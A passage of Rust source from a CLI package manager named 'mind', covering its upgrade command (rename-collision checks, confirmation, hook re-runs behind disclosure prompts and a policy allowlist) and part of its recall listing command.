        // `up.new_name` is the bare effective name (`CatalogItem::effective_name`);
        // the manifest is keyed `kind:name` (`InstalledItem::key`), so the lookup
        // key must carry the kind prefix too.
        let new_key = format!("{}:{}", up.old.kind.as_str(), up.new_name);
        if let Some(occupant) = manifest.items.get(&new_key) {
            let same_identity = occupant.kind == up.old.kind
                && occupant.bare_name == up.old.bare_name
                && occupant.source == up.old.source;
            if !same_identity {
                // spec: DSC-95 -- sanitize each field passed into the
                // error before it is embedded in the (source-controlled-name
                // carrying) Display message.
                return Err(MindError::UpgradeRenameCollision {
                    key: strip_ansi(&new_key),
                    existing_source: strip_ansi(&occupant.source),
                    incoming: strip_ansi(up.old.key().as_str()),
                    incoming_source: strip_ansi(&up.old.source),
                });
            }
        }
    }

    // spec: LIFE-46 -- the guard above compares each rename against the
    // PRE-EXISTING manifest, but two pending items in ONE batch can converge on
    // the same target key when neither key is occupied yet (each source drops
    // its prefix in the same upgrade). The first install then becomes the
    // second's "previous version" and is evicted silently. Detect a duplicate
    // target key WITHIN `pending` too (verified: sources `jx:review` and
    // `jy:review` both dropping their prefixes). The result key of an item that
    // is not renaming is its unchanged key, so a rename colliding with a
    // non-renaming sibling is caught as well.
    {
        use std::collections::HashMap;
        let mut seen: HashMap<String, &Upgrade> = HashMap::new();
        for up in &pending {
            let key = format!("{}:{}", up.old.kind.as_str(), up.new_name);
            if let Some(prev) = seen.get(&key) {
                let same_identity = prev.old.kind == up.old.kind
                    && prev.old.bare_name == up.old.bare_name
                    && prev.old.source == up.old.source;
                if !same_identity {
                    // spec: DSC-95
                    return Err(MindError::UpgradeRenameCollision {
                        key: strip_ansi(&key),
                        existing_source: strip_ansi(&prev.old.source),
                        incoming: strip_ansi(up.old.key().as_str()),
                        incoming_source: strip_ansi(&up.old.source),
                    });
                }
            } else {
                seen.insert(key, up);
            }
        }
    }

    if !yes {
        // spec: LIFE-45 -- B1: `--json` is non-interactive (mirrors DEP-60): a
        // `--json` run without `--yes` refuses instead of silently applying the
        // upgrades. Unlike DEP-60's own gate, this does NOT also require a real
        // TTY: the text-mode prompt below reads stdin directly and already
        // treats EOF/no-input as a safe decline (`read_confirm`), so a
        // non-interactive *text*-mode run (e.g. piped stdin with no reply) was
        // never able to apply an upgrade unprompted -- only `--json` could
        // bypass it, by skipping the confirm call entirely.
        // spec: CLI-233 CLI-234 CLI-235 -- a filter (`sync <filter> --upgrade`,
        // or `upgrade <item>`) can match more sources than the caller
        // pictured; when it matched more than one, `multi_source_note` (built
        // above, and already disclosed once -- stdout in text mode, stderr
        // under `--json` -- before `rerun_source_hooks` ran) names them. The
        // `!yes` `--json` refusal still folds the SAME note into
        // `ConfirmationRequired.action`, so a `--json` caller without `--yes`
        // sees it there too, alongside the earlier stderr disclosure. Text
        // mode does NOT print it again here: CLI-235 already printed it once,
        // above, before the hooks it warns about ran.
        if out.json {
            // spec: CLI-232 CLI-233 CLI-234 CLI-235
            let action = match &multi_source_note {
                Some(note) => {
                    json_confirmation_action(format!("applying pending upgrades ({note})"), true)
                }
                None => json_confirmation_action("applying pending upgrades", true),
            };
            return Err(MindError::ConfirmationRequired { action });
        }
        if !confirm_default_yes("apply these upgrades?")? {
            println!("aborted; nothing changed");
            return Ok(None);
        }
    }

    let mut manifest = manifest;
    let mut applied: Vec<String> = Vec::new();
    let mut renamed = false;
    for up in &pending {
        let siblings = siblings_of(&catalog, &up.cat.source);
        // Build the new version first; the old copy is preserved until this
        // succeeds (transactional install). An upgrade never force-overwrites a
        // foreign target; that is for an explicit `learn --force`.
        //
        // spec: LIFE-48 -- H3: a failure partway through this batch must not
        // lose the manifest state for items already upgraded on disk (mirrors
        // `learn`/`forget`, which deliberately save on their failure path).
        // Each fallible step below therefore saves whatever has been applied
        // so far before propagating, instead of letting `?` unwind straight
        // out of the loop with an unsaved manifest.
        // spec: LNK-18 -- reconcile a link instance's unsatisfiable references
        // here too, so an upstream edit that adds a `requires` entry does not
        // turn every later `upgrade` of that link into a hard failure.
        let (cat, dropped_requires) = match link_reconciled(paths, &registry, &up.cat) {
            Ok(c) => c,
            Err(e) => {
                if let Err(se) = manifest.save(paths) {
                    warn_manifest_save_also_failed(&se);
                }
                return Err(e);
            }
        };
        // spec: HOOK-125 -- an in-place upgrade re-installs over the existing
        // install, so the item's update hooks (if any) replace its install
        // hooks. A rename (a prefix change) is not: the old item is removed
        // with its uninstall hooks and the new name is a first install.
        let is_update = up.new_name == up.old.name;
        let installed = match install_item(
            paths,
            &cat,
            &up.new_commit,
            &siblings,
            false,
            dangerously_skip_hook_check,
            dangerously_skip_build_hook_check,
            is_update,
        ) {
            Ok(mut i) => {
                // spec: LNK-19 -- carry the LNK-18 drop record across the
                // upgrade too, so it reflects the version now on disk (an
                // upstream edit may have added or removed such an entry).
                i.dropped_requires = dropped_requires;
                i
            }
            Err(e) => {
                // spec: LIFE-48 -- persist what earlier items applied, but do not
                // let a save failure mask the root cause `e`.
                if let Err(se) = manifest.save(paths) {
                    warn_manifest_save_also_failed(&se);
                }
                return Err(e);
            }
        };
        if up.new_name != up.old.name {
            // Rename: drop the old item (by its file registry) and re-key. The OLD
            // item is removed, so its uninstall hook fires (HOOK-82); the new
            // item's install hook already ran in install_item above.
            //
            // spec: LIFE-47 -- B3: strip any link the new install already owns
            // before removing the old ones. Agents link under the bare harness
            // name (NS-40) regardless of the item's effective name, so a
            // prefix-only rename can produce `old.links == installed.links`;
            // removing them unfiltered would delete the link the new install
            // just created, leaving the manifest claiming a link that no
            // longer exists (mirrors the in-place branch below).
            let mut old_for_uninstall = up.old.clone();
            old_for_uninstall
                .links
                .retain(|l| !installed.links.contains(l));
            if let Err(e) = uninstall_item(
                paths,
                &old_for_uninstall,
                &up.cat.uninstall_hooks(),
                &up.old.commit,
                dangerously_skip_hook_check,
            ) {
                // The new copy is already live on disk (install_item succeeded
                // above); record it before propagating. Recording it keeps the
                // manifest matching disk and makes it visible to `hooks run`
                // (HOOK-110); a later `upgrade` retry still re-runs install_item
                // (install hooks included), which is why the record is safe to
                // leave. The old key is left in place (it was never removed), so
                // both entries are recorded until this is resolved.
                manifest.insert(installed);
                // spec: LIFE-48 -- a save failure here must not mask `e`.
                if let Err(se) = manifest.save(paths) {
                    warn_manifest_save_also_failed(&se);
                }
                return Err(e);
            }
            manifest.items.remove(up.old.key().as_str());
            renamed = true;
            if !out.json {
                println!(
                    "{} upgraded {} -> {}",
                    out.ok(),
                    up.old.display_key(),
                    out.green(&installed.display_key())
                );
            }
        } else {
            // In-place upgrade (same effective name, so not a rename). The link
            // set can still change when an agent's harness name (its frontmatter
            // `name`, NS-40) changed: the new copy links under the new bare name,
            // so remove any old link the new install no longer owns, leaving no
            // orphaned symlink behind.
            for old_link in &up.old.links {
                if !installed.links.contains(old_link)
                    && let Err(e) = install::remove_path(std::path::Path::new(old_link))
                {
                    manifest.insert(installed);
                    // spec: LIFE-48 -- a save failure here must not mask `e`.
                    if let Err(se) = manifest.save(paths) {
                        warn_manifest_save_also_failed(&se);
                    }
                    return Err(e);
                }
            }
            if !out.json {
                println!(
                    "{} upgraded {}",
                    out.ok(),
                    out.green(&installed.display_key())
                );
            }
        }
        // spec: DSC-95
        applied.push(installed.display_key());
        manifest.insert(installed);
    }
    manifest.save(paths)?;
    if out.json {
        let outcome = if renamed { "renamed" } else { "upgraded" };
        let mut result = MutationResult::new("upgrade", target, outcome);
        result.installed = applied;
        return Ok(Some(result));
    }
    Ok(None)
}

/// HOOK-11, HOOK-55, HOOK-121: run each source's pending hooks for an update.
///
/// Which hooks those are depends on the source (HOOK-122): a source that
/// declares any `event = "update"` hook offers its pending UPDATE hooks and does
/// not re-run its install hooks; one that declares none re-offers its pending
/// install hooks, as before. Pending means the same thing for both (HOOK-55,
/// HOOK-124): a recorded run-commit that is absent or behind the source's
/// current commit.
///
/// Same trust boundary as `meld`: prompt and disclose, unless
/// `--dangerously-skip-install-hook-check` is set or there is no TTY. In
/// `upgrade`, Abort is treated as Skip: the source is already registered, so
/// declining the re-run just leaves the existing install in place. Persists the
/// registry only if a hook was run and its recorded commit advanced.
// spec: HOOK-121 HOOK-122 HOOK-124
fn rerun_source_hooks(
    paths: &Paths,
    registry: &mut Registry,
    dangerously_skip_hook_check: bool,
    in_scope: Option<&HashSet<String>>,
    policy: Option<&Policy>,
) -> Result<()> {
    let mut changed = false;
    for source in &mut registry.sources {
        let dir = source.clone_dir(paths);
        let pending = pending_update_hooks(source, &dir);
        if pending.hooks.is_empty() {
            continue;
        }
        // HOOK-11 scope: a scoped `upgrade <item>` restricts the hook re-run to
        // sources implicated by the filter. `None` = unscoped (all sources).
        if let Some(scope) = in_scope
            && !scope.contains(&source.name)
        {
            continue;
        }
        // POL-12: with the allowlist locked, do not re-run the install hook
        // (arbitrary code) for a source whose identity is no longer allowed;
        // report and skip it, exactly as the per-item loop does.
        if let Some(policy) = policy
            && policy.lock()
            && !policy.allow_matches(&source.base_identity())
        {
            if !json_mode() {
                println!(
                    "skipping {} hook for {}: source not permitted by the managed policy's allowlist",
                    pending.event, source.name
                );
            }
            continue;
        }

        let event = pending.event;
        let recorded_event = pending.recorded_event;
        let pin_desc = pin_description(&source.pin);
        let commit = source.commit.clone().unwrap_or_default();
        let clone_path = dir.display().to_string();

        for hook in pending.hooks {
            let run = if dangerously_skip_hook_check {
                // HOOK-23: re-run without prompting.
                if !json_mode() {
                    println!(
                        "note: running {event} hook for {} without the safety prompt (--dangerously-skip-install-hook-check)",
                        source.name
                    );
                }
                true
            } else if !crate::hook::is_tty() {
                // HOOK-22: no TTY; never run silently. Skip the re-run.
                if !json_mode() {
                    println!(
                        "note: skipped the {event} hook for {} (no TTY); its tooling may be out of date until the hook is run",
                        source.name
                    );
                }
                false
            } else {
                // spec: HOOK-24 - show a browse URL pinned to the disclosed commit.
                let browse_url = source.browse_url(&commit);
                let disclosure = crate::hook::hook_disclosure_text(
                    &hook.label,
                    event,
                    hook.optional,
                    &source.name,
                    &pin_desc,
                    &commit,
                    &clone_path,
                    &hook.run,
                    hook.declared_override.as_deref(),
                    browse_url.as_deref(),
                );
                // Abort is treated as Skip here (the source is already
                // registered, per the HOOK-11 note), so both prompts have the
                // same two outcomes; the optional/required distinction still
                // decides the prompt's shape and how the hook is disclosed
                // (HOOK-52), which is why `optional` is carried from the
                // declaration rather than assumed.
                if hook.optional {
                    matches!(
                        crate::hook::prompt_choice_optional(&disclosure)?,
                        crate::hook::OptionalChoice::Run
                    )
                } else {
                    matches!(
                        crate::hook::prompt_choice(&disclosure)?,
                        crate::hook::HookChoice::RunAndContinue
                    )
                }
            };

            if run {
                // HOOK-30: a non-zero exit is a hard error. The source stays
                // registered; just propagate the failure.
                //
                // spec: LIFE-48 -- H3: persist any hook runs already recorded
                // in this pass before propagating, so an earlier source's
                // successful re-run is not lost (and its side effect not
                // silently re-offered on the next pass).
                if let Err(e) =
                    crate::hook::run_hook(&hook.run, &dir, &source.name, event, &hook.label)
                {
                    if changed {
                        registry.save(paths)?;
                    }
                    return Err(e);
                }
                // HOOK-55, HOOK-124: record the commit the hook ran at. An
                // update hook shares the install hooks' recorded set, but not
                // their key: the record is keyed by (command, event), so a run
                // of one event never settles the other.
                let ran_at = source.commit.clone();
                record_install_hook(source, &hook.run, recorded_event, ran_at);
                changed = true;
                if !json_mode() {
                    println!("ran {event} hook for {}", source.name);
                }
            }
        }
    }
    if changed {
        registry.save(paths)?;
    }
    Ok(())
}

/// One hook `upgrade` should offer for a source, resolved to what the run and
/// the disclosure need.
struct UpgradeHook {
    run: String,
    label: String,
    optional: bool,
    /// The declared command(s) a consumer `--install-hook` override replaced,
    /// for the loud override note in the disclosure (HOOK-56). `None` when this
    /// is not an overriding hook.
    declared_override: Option<String>,
}

/// The hooks `upgrade` should offer for one source, and the event they belong
/// to (HOOK-121, HOOK-122).
struct PendingUpgradeHooks {
    /// The event's name, for the disclosure and the notes.
    event: &'static str,
    /// The same event, for the run record's key (HOOK-124).
    recorded_event: RecordedEvent,
    hooks: Vec<UpgradeHook>,
}

/// Select the hooks an `upgrade` offers for `source`, whose clone is at
/// `clone_dir` (HOOK-122). I/O wrapper around [`select_upgrade_hooks`]: reads
/// the clone's `mind.toml` and hands the selector what it declares.
///
/// A clone that cannot be read, or whose manifest does not parse, declares
/// nothing. That is deliberately fail-closed on BOTH branches: no update hook
/// is offered, and no recorded install hook is replayed either, since a record
/// alone cannot show that the source still stands behind the command (HOOK-55).
/// `upgrade` reports the broken source through the scan below.
// spec: HOOK-121 HOOK-122 HOOK-124
fn pending_update_hooks(
    source: &crate::source::Source,
    clone_dir: &std::path::Path,
) -> PendingUpgradeHooks {
    let loaded = MindToml::load(clone_dir).ok().flatten();
    let has_manifest = loaded.is_some();
    let declared = loaded
        .map(|mf| {
            mf.resolved_hooks(&clone_dir.join("mind.toml"))
                .unwrap_or_default()
        })
        .unwrap_or_default();
    select_upgrade_hooks(source, &declared, has_manifest)
}

/// The pure hook selection behind [`pending_update_hooks`] (HOOK-122).
///
/// A source that has any update hook in effect offers its pending update hooks
/// and none of its install hooks; one that has none re-offers its pending
/// recorded install hooks (HOOK-11/55), the unchanged behavior for every source
/// that has not opted in.
///
/// "In effect" is the clone's declared update hooks (`declared`) plus the
/// curated `[[discover.sources.hooks]]` update entries recorded on the source
/// (HOOK-127) -- those live in the parent super-source's manifest, so the clone
/// can never be asked about them -- and, when the consumer melded with
/// `--install-hook`, that override replaces the lot (HOOK-56: the override
/// covers the install AND the update event, so a source cannot escape it by
/// moving the command to `event = "update"`).
///
/// `has_manifest` is the DSC-60 gate: once the source ships a `mind.toml` of its
/// own, curated values stop applying to it.
// spec: HOOK-56 HOOK-121 HOOK-122 HOOK-124 HOOK-127
fn select_upgrade_hooks(
    source: &crate::source::Source,
    declared: &[crate::mindfile::ResolvedHook],
    has_manifest: bool,
) -> PendingUpgradeHooks {
    let current = source.commit.as_deref();
    let keep_curated = !has_manifest;

    // The update hooks in effect: declared first, then curated (the meld order).
    let mut updates: Vec<UpgradeHook> = declared
        .iter()
        .filter(|h| h.event == HookEvent::Update)
        .map(|h| UpgradeHook {
            run: h.run.clone(),
            label: h.label().to_string(),
            optional: h.optional,
            declared_override: None,
        })
        .collect();
    if keep_curated {
        updates.extend(
            source
                .install_hooks
                .iter()
                .filter(|r| r.origin == Some(HookOrigin::Curated))
                .filter(|r| r.event() == RecordedEvent::Update)
                .map(|r| UpgradeHook {
                    run: r.command.clone(),
                    label: r.label().to_string(),
                    optional: r.optional,
                    declared_override: None,
                }),
        );
    }

    if !updates.is_empty() {
        // HOOK-56: the consumer's command replaces every update hook, and says
        // so loudly, exactly as it does at meld for the install event.
        if let Some(cmd) = source.override_command() {
            let replaced: Vec<String> = updates.iter().map(|h| h.run.clone()).collect();
            updates = vec![UpgradeHook {
                run: cmd.to_string(),
                label: cmd.to_string(),
                optional: false,
                declared_override: Some(replaced.join("; ")),
            }];
        }
        updates.retain(|h| !hook_ran_at(source, &h.run, RecordedEvent::Update, current));
        return PendingUpgradeHooks {
            event: RecordedEvent::Update.as_str(),
            recorded_event: RecordedEvent::Update,
            hooks: updates,
        };
    }

    // No update hooks: re-offer the pending recorded install hooks, recovering
    // each one's label and `optional` flag from what the source declares now.
    // The record carries neither (a name is not part of a command's identity),
    // so building the disclosure from the record alone would rename the
    // author's hook to its raw command and call an optional hook required.
    let declared_install: Vec<String> = declared
        .iter()
        .filter(|h| h.event == HookEvent::Install)
        .map(|h| h.run.clone())
        .collect();
    PendingUpgradeHooks {
        event: RecordedEvent::Install.as_str(),
        recorded_event: RecordedEvent::Install,
        hooks: source
            .pending_install_hooks(current, &declared_install, keep_curated)
            .into_iter()
            .map(|r| {
                let decl = declared
                    .iter()
                    .find(|h| h.event == HookEvent::Install && h.run == r.command);
                // HOOK-56: an overriding command keeps its loud note here too,
                // naming what the source declares in its place.
                let declared_override = (r.origin == Some(HookOrigin::Override)
                    && !declared_install.is_empty())
                .then(|| declared_install.join("; "));
                UpgradeHook {
                    run: r.command.clone(),
                    label: decl
                        .map(|d| d.label())
                        .unwrap_or_else(|| r.label())
                        .to_string(),
                    optional: decl.map(|d| d.optional).unwrap_or(r.optional),
                    declared_override,
                }
            })
            .collect(),
    }
}

/// What `upgrade` should do with one installed item before the catalog lookup.
#[derive(Debug, PartialEq, Eq)]
enum UpgradeDisposition {
    /// The item is outside the scoped item-ref selection: skip silently.
    OutOfScope,
    /// In scope, but its source is barred by the locked policy allowlist
    /// (POL-12): print a skip line.
    PolicyBlocked,
    /// In scope, under a locked policy, but its recorded source name matches
    /// no registered source at all (spec: POL-69): print a skip line that
    /// says so, distinct from `PolicyBlocked`. The item is still not
    /// upgraded (fail closed, POL-68), but the reason is that the source was
    /// unmelded, not that it fell outside the allowlist.
    SourceNotRegistered,
    /// In scope and permitted: consider it for an upgrade.
    Consider,
}

/// The identity to match a *recorded* source name against the managed policy
/// allowlist (spec: POL-67).
///
/// A name recorded on an installed item or an install target is an instance
/// identity, which may carry an item-link `#path` and/or a consumer `@alias`
/// suffix. The allowlist matches the base `host/owner/repo`, and the only
/// sound way to recover that from a name is structurally, through the
/// registered source itself; scanning the string for the first `#`/`@` is a
/// policy bypass (POL-68).
///
/// A name with no registered source has no structural base identity, so it is
/// returned unchanged and will simply fail to match (fail closed). That state
/// means an installed item outlived its source, which `introspect` reports.
fn policy_identity(registry: &Registry, source_name: &str) -> String {
    registry
        .find(source_name)
        .map(|s| s.base_identity())
        .unwrap_or_else(|| source_name.to_string())
}

/// Decide an installed item's `upgrade` disposition. The item-ref filter and
/// the source scope are both applied first (POL-12 ordering fix, CLI-232): a
/// scoped `upgrade <item>` or a scoped `sync <source> --upgrade` must not emit
/// policy-skip lines for sources the user never selected. The policy block is
/// only ever reported for items that passed both filters.
fn upgrade_item_disposition(
    installed: &crate::manifest::InstalledItem,
    filter: Option<&crate::resolve::ItemRef>,
    // spec: CLI-232 -- H2 fix: `sync <source> --upgrade`'s source scope. `None`
    // means every source is in scope (the unscoped `mind upgrade` behavior is
    // unchanged); `Some(set)` restricts consideration to installed items whose
    // recorded source name is in `set`, exactly like `filter` restricts by item.
    source_scope: Option<&HashSet<String>>,
    // spec: TUI-72 TUI-73 - the TUI's confirmed-set apply scope: `None` means
    // unrestricted by key (every non-TUI caller); `Some(set)` restricts
    // consideration to installed items whose exact key (`kind:name`) is in
    // `set`, so `upgrade_no_sync_keys` acts on precisely the confirmed items.
    key_scope: Option<&HashSet<String>>,
    policy: Option<&Policy>,
    registry: &Registry,
) -> UpgradeDisposition {
    if let Some(f) = filter
        && !crate::resolve::installed_matches_glob(installed, f)
    {
        return UpgradeDisposition::OutOfScope;
    }
    if let Some(scope) = source_scope
        && !scope.contains(&installed.source)
    {
        return UpgradeDisposition::OutOfScope;
    }
    if let Some(scope) = key_scope
        && !scope.contains(installed.key().as_str())
    {
        return UpgradeDisposition::OutOfScope;
    }
    if let Some(policy) = policy
        && policy.lock()
    {
        // spec: POL-69 -- distinguish "no registered source has this name"
        // (POL-68's fail-closed fallback: no base pattern can admit the
        // recorded name verbatim) from "a registered source's base identity
        // is outside the allowlist". Both still refuse the upgrade, but only
        // the latter is actually a policy-allowlist decision.
        if registry.find(&installed.source).is_none() {
            return UpgradeDisposition::SourceNotRegistered;
        }
        if !policy.allow_matches(&policy_identity(registry, &installed.source)) {
            return UpgradeDisposition::PolicyBlocked;
        }
    }
    UpgradeDisposition::Consider
}

struct Upgrade {
    cat: CatalogItem,
    old: crate::manifest::InstalledItem,
    new_commit: String,
    new_hash: String,
    new_name: String,
}

fn print_upgrade_report(registry: &Registry, pending: &[Upgrade]) {
    let out = crate::render::ctx();
    let n = pending.len();
    let (noun, verb) = if n == 1 {
        ("item", "has")
    } else {
        ("items", "have")
    };
    println!("{n} {noun} {verb} upstream changes:\n");
    for up in pending {
        // spec: DSC-95 -- sanitize every source-controlled field before
        // composing the line (not the composed line after): this report
        // prints right before a default-yes confirmation, so an unterminated
        // escape in one field must not be able to consume a later one and
        // read as "nothing to do".
        let cat_name = crate::sanitize::strip_ansi(&up.cat.name);
        let cat_source = crate::sanitize::strip_ansi(&up.cat.source);
        let old_name = crate::sanitize::strip_ansi(&up.old.name);
        let new_name = crate::sanitize::strip_ansi(&up.new_name);
        if up.new_name != up.old.name {
            println!(
                "  {} {} {} {}  rename {} -> {}",
                out.warn(),
                up.cat.kind,
                cat_name,
                out.dim(&format!("[{cat_source}]")),
                old_name,
                out.green(&new_name)
            );
        } else {
            println!(
                "  {} {} {}",
                out.warn(),
                up.cat.display_key(),
                out.dim(&format!("[{cat_source}]"))
            );
        }
        println!(
            "    {}    {} -> {}",
            out.dim("hash"),
            short(&up.old.hash),
            short(&up.new_hash)
        );
        println!(
            "    {}  {} -> {}",
            out.dim("commit"),
            short(&up.old.commit),
            short(&up.new_commit)
        );
        if let Some(src) = registry.find(&up.cat.source)
            && !up.old.commit.is_empty()
            && !up.new_commit.is_empty()
            && let Some(url) = src.compare_url(&up.old.commit, &up.new_commit)
        {
            println!("    {}    {url}", out.dim("diff"));
        }
        println!();
    }
}

/// `mind recall [--sources] [item] [--kind K] [--source S] [--json] [--tree]`. The
/// `--kind` and `--source` filters narrow the installed-items listing; they do
/// not apply to `--sources` or to a single-item lookup (use a `kind:`/
/// `owner/repo#` ref there). `--json` emits the data as JSON on stdout.
/// `--tree` renders the installed dependency forest (DEP-61).
pub fn recall(
    paths: &Paths,
    sources: bool,
    item: Option<&str>,
    kind: Option<ItemKind>,
    source: Option<&str>,
    json: bool,
    tree: bool,
) -> Result<()> {
    let out = crate::render::ctx();
    // The listing filters are meaningless for --sources or a single-item lookup;
    // say so rather than silently ignoring them.
    if (sources || item.is_some()) && (kind.is_some() || source.is_some()) {
        eprintln!(
            "note: --kind/--source filter the item listing; ignored with --sources or a single item"
        );
    }
    // --tree is meaningless with --sources; note and ignore.
    if tree && sources {
        eprintln!("note: --tree shows the dependency forest; ignored with --sources");
    }

    // DEP-61 / DEP-63: --tree renders the installed dependency forest.
    if tree && !sources {
        // spec: DEP-61
        let manifest = Manifest::load(paths)?;
        let registry = Registry::load(paths)?;
        let catalog = catalog::scan(paths, &registry).unwrap_or_default();
        // Match by stable identity (source as well as key), so two sources
        // both offering an unprefixed name do not render duplicate nodes.
        let graph = crate::deps::installed_graph(
            &catalog,
            |it| {
                manifest
                    .items
                    .get(it.key().as_str())
                    .is_some_and(|m| m.source == it.source)
            },
            read_item_text,
        );

        if json {
            // spec: DEP-63 -- structured JSON output instead of the human rendering.
            if let Some(item_ref) = item {
                // Scoped to one item's subtree: emit a single JSON object.
                let parsed = parse_item_ref(item_ref)?;
                let found = crate::resolve::resolve_installed(&manifest.items, &parsed)?;
                let key = found.key();
                // subtree_node returns None when the item is installed but has
                // no catalog entry (and thus no node in the graph); fall back
                // to a no-dependency node so the caller always gets valid JSON.
                // spec: DSC-95 -- the fallback's own key must be
                // sanitized too (the lookup itself needs the raw key).
                let node = graph
                    .subtree_node(key.as_str())
                    .unwrap_or_else(|| crate::deps::DepNode::normal(found.display_key(), vec![]));
                return print_json(&node);
            } else {
                // Full forest: emit a JSON array of root nodes.
                return print_json(&graph.forest_nodes());
            }
        }

        if let Some(item_ref) = item {
            // Scoped to one item's subtree.
            let parsed = parse_item_ref(item_ref)?;
            let found = crate::resolve::resolve_installed(&manifest.items, &parsed)?;
            let key = found.key();
            match graph.render_subtree(key.as_str()) {
                Some(subtree) => print!("{subtree}"),
                // spec: DSC-95
                None => println!("{}", found.display_key()),
            }
        } else {
            // Full forest.
            let forest = graph.render_forest();
            if forest.is_empty() {
                println!("no installed items");
            } else {
                print!("{forest}");
            }
        }
        return Ok(());
    }
    // CLI-86: the `--source` glob filter shares `source_matches_glob`; reject a
    // malformed pattern up front rather than silently matching nothing.
    if let Some(s) = source {
        crate::resolve::validate_source_selector(s)?;
    }

    if sources {
        let registry = Registry::load(paths)?;
        if json {
            // spec: CLI-167 - array wrapped in versioned envelope.
            return print_json_envelope(&registry.sources);
        }
        if registry.sources.is_empty() {
            // spec: CLI-187
            println!("no sources melded; run `mind meld <owner/repo>` to add one");
            return Ok(());
        }
        let rows = registry
            .sources
            .iter()
            .map(|s| {
                let commit = s
                    .commit
                    .as_deref()
                    .map(short)
                    .unwrap_or_else(|| "unsynced".into());
                let ns = match &s.alias {
                    Some(a) => format!(" namespace:{a}"),
                    None => String::new(),
                };
                // HOOK-58: surface that a source carries install hooks with a
                // count-aware token.
                let hook = match s.install_hooks.len() {
                    0 => String::new(),
                    1 => " hook".to_string(),
                    n => format!(" hooks({n})"),
                };
                // MKT-10: show the manifest origin so a native-plugin source is
                // distinguishable from a convention or mind.toml source.
                let origin = origin_label(s.origin);
                vec![
                    out.bullet(),
                    s.name.clone(),
                    out.dim(&s.url),
                    out.dim(&format!("[{commit}{ns}{hook}{origin}]")),
                    s.description.clone().unwrap_or_default(),
                ]
            })
            .collect::<Vec<_>>();
        out.print_rows(&rows);
        return Ok(());
    }

    let manifest = Manifest::load(paths)?;
    if let Some(item_ref) = item {
        let parsed = parse_item_ref(item_ref)?;
        let found = crate::resolve::resolve_installed(&manifest.items, &parsed)?;
        if json {
            // DSC-95: the serialized `name`/`store`/`links` embed a
            // source-controlled bare name; sanitize the display copy so a
            // bidi/ANSI name cannot ride the `--json` document to a terminal
            // (serde escapes ESC but not a bidi override).
            return print_json(&found.sanitized_for_display());
        }
        println!("{}", out.bold(&found.display_key()));
        if let Some(d) = &found.description {
            println!("  {}{d}", out.dim("desc    "));
        }
        println!("  {}{}", out.dim("source  "), found.source);
        println!("  {}{}", out.dim("commit  "), short(&found.commit));
        println!("  {}{}", out.dim("hash    "), short(&found.hash));
        // DSC-95: store/link paths embed the source-controlled bare name.
        println!(
            "  {}{}",
            out.dim("store   "),
            crate::sanitize::strip_ansi(&paths.mind_home.join(&found.store).display().to_string())
        );
        for link in &found.links {
            println!(
                "  {}{}",
                out.dim("link    "),
                crate::sanitize::strip_ansi(link)
            );
        }
        // spec: LNK-19 -- a requirement dropped at install (LNK-18) is part of
        // this item's state, not a one-off install message, so it is shown here
        // every time the item is inspected.
        if !found.dropped_requires.is_empty() {
            println!(
                "  {}{}",
                out.dim("dropped "),
                out.yellow(&format!(
                    "requires {} (unsatisfiable from a single-item link)",
                    found
                        .dropped_requires
                        .iter()
                        .map(|e| crate::sanitize::strip_ansi(e))
                        .collect::<Vec<_>>()
                        .join(", ")
                ))
            );
        }
        // CLI-75 / LIFE-11: mark out of date exactly when `upgrade` would act --
        // source-content hash changed, or effective name changed (rename).
        {
            let registry = Registry::load(paths)?;
            let catalog = catalog::scan(paths, &registry)?;
            if let Some(cat) = catalog.iter().find(|c| {
                c.kind == found.kind && c.name == found.bare_name && c.source == found.source
            }) {
                // CLI-75: a hash error counts as drift (see the recall listing
                // site); the marker errs toward flagging rather than hiding it.
                let hash_lag = cat.content_hash().map_or(true, |h| h != found.hash);
                let rename_lag = cat.effective_name() != found.name;
                if hash_lag || rename_lag {
                    println!(
                        "  {}{}",
                        out.dim("status  "),
                        out.yellow("out of date; run `mind upgrade`")
                    );
                }
            }
        }
        return Ok(());
    }

    // CLI-70/74: the status view -- each melded source with its catalog items
    // nested beneath it, every item marked installed (with commit) or available.
    // Items installed but no longer in the source's catalog (removed upstream) are
    // shown too, marked. `--kind`/`--source` filter what is shown.
    let registry = Registry::load(paths)?;
    let catalog = catalog::scan(paths, &registry)?;
    let filtering = kind.is_some() || source.is_some();

    // The source's catalog items (honoring --kind), sorted by key.
    let cat_items = |s: &crate::source::Source| -> Vec<&CatalogItem> {
        let mut v: Vec<&CatalogItem> = catalog
            .iter()
            .filter(|it| it.source == s.name && kind.is_none_or(|k| it.kind == k))
            .collect();
        v.sort_by_key(|x| x.key());
        v
    };
    // Installed items of a source with no catalog match (removed upstream). An
    // item is an orphan only when NO catalog item shares its stable identity
    // (source, kind, bare_name). A pure namespace/prefix rename keeps the same
    // bare identity, so it is NOT an orphan -- it is matched in the status loop
    // and marked outdated. A genuinely removed-upstream item has no such match.
    let orphans_of = |s: &crate::source::Source| -> Vec<&crate::manifest::InstalledItem> {
        let mut v: Vec<&crate::manifest::InstalledItem> = manifest
            .items
            .values()
            .filter(|m| {
                m.source == s.name
                    && kind.is_none_or(|k| m.kind == k)
                    && !catalog.iter().any(|it| {
                        it.source == m.source && it.kind == m.kind && it.name == m.bare_name
                    })
            })
            .collect();
        v.sort_by_key(|x| x.key());
        v
    };
    // CLI-86: the `--source` filter accepts a glob, matched against each source's
    // identity and trailing-suffix forms; a multi-source match is the normal case.
    let source_shown =
        |s: &crate::source::Source| source.is_none_or(|q| source_matches_glob(&s.name, q));

    if json {
        let out: Vec<serde_json::Value> = registry
            .sources
            .iter()
            .filter(|s| source_shown(s))
            .map(|s| {
                let items = cat_items(s);
                let mut rows: Vec<serde_json::Value> = items
                    .iter()
                    .map(|it| {
                        // Match by stable identity (source, kind, bare_name) so a
                        // renamed item still resolves to its manifest entry.
                        let inst = manifest.items.values().find(|m| {
                            m.source == it.source && m.kind == it.kind && m.bare_name == it.name
                        });
                        serde_json::json!({
                            // DSC-95: the key embeds a source-controlled name.
                            "key": it.display_key(),
                            "installed": inst.is_some(),
                            "commit": inst.map(|m| m.commit.clone()),
                        })
                    })
                    .collect();
                for m in orphans_of(s) {
                    rows.push(serde_json::json!({
                        "key": m.display_key(),
                        "installed": true,
                        "commit": m.commit.clone(),
                        "orphaned": true,
                    }));
                }
                serde_json::json!({
                    "name": s.name,
                    "url": s.url,
                    "commit": s.commit,
                    "alias": s.alias,
                    "items": rows,
                })
            })
            .collect();
        // spec: CLI-167 - array wrapped in versioned envelope.
        return print_json_envelope(&out);
    }

    if registry.sources.is_empty() {
        // spec: CLI-187
